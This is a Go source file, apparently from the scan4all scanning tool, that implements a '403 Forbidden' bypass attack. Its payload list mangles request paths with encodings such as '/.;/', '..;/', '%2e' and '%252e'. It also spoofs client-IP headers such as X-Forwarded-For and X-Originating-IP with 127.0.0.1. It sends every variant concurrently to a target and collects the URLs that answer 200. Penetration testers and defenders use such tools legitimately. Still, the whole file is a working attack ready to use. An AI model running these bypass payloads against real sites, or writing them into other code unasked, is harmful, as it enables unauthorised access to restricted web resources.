package brute

import (
	"context"
	"github.com/GhostTroops/scan4all/lib/util"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"time"
)

var (
	reURL          = regexp.MustCompile("^https?://")
	headerPayloads = []string{
		"X-Custom-IP-Authorization",
		"X-Originating-IP",
		"X-Forwarded-For",
		"X-Remote-IP",
		"X-Client-IP",
		"X-Host",
		"X-Forwarded-Host",
		"X-ProxyUser-Ip",
		"X-Remote-Addr",
	}
)

const (
	headerValue string = "127.0.0.1"
)

type Result403 struct {
	Url string
	Ok  bool
	Err error
}

func getValidDomain(domain string) string {
	trimmedDomain := strings.TrimSpace(domain)

	if !reURL.MatchString(trimmedDomain) {
		trimmedDomain = "https://" + trimmedDomain
	}

	return trimmedDomain
}
func constructEndpointPayloads(domain, path string) []string {
	return []string{
		domain + "/" + strings.ToUpper(path),
		domain + "/" + path + "/",
		domain + "/" + path + "/.",
		domain + "//" + path + "//",
		domain + "/./" + path + "/./",
		domain + "/./" + path + "/..",
		domain + "/;/" + path,
		domain + "/.;/" + path,
		domain + "//;//" + path,
		domain + "/" + path + "..;/",
		domain + "/%2e/" + path,
		domain + "/%252e/" + path,
		domain + "/%ef%bc%8f" + path,
	}
}

func PenetrateEndpoint(wg *sync.WaitGroup, url string, rst chan Result403, header ...string) {
	ctx, cancel := context.WithTimeout(util.Ctx_global, 20*time.Second)
	defer func() {
		cancel()
		wg.Done()
	}()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		rst <- Result403{Ok: false, Url: url, Err: err}
		return
	}

	var h string
	if header != nil {
		h = header[0]
		req.Header.Set(h, headerValue)
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		rst <- Result403{Ok: false, Url: url, Err: err}
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		rst <- Result403{Ok: false, Url: url, Err: err}
		return
	} else {
		rst <- Result403{Ok: true, Url: url, Err: err}
		return
	}
}

// 403 bypass
func ByPass403(domain, path *string, wg *sync.WaitGroup) []string {
	validDomain := getValidDomain(*domain)
	validPath := strings.TrimSpace(*path)
	endpoints := constructEndpointPayloads(validDomain, validPath)
	var xL int = len(endpoints) + len(headerPayloads)
	var x01 = make(chan Result403, xL)

	wg.Add(xL)
	for _, e := range endpoints {
		go PenetrateEndpoint(wg, e, x01)
	}
	for _, h := range headerPayloads {
		go PenetrateEndpoint(wg, validDomain+"/"+validPath, x01, h)
	}
	aR := []string{}
	var n = 0
BreakAll:
	for {
		select {
		case x02 := <-x01:
			n = n + 1
			if x02.Ok {
				aR = append(aR, x02.Url)
			}
			if n >= xL {
				break BreakAll
			}
		}
	}
	return aR
}
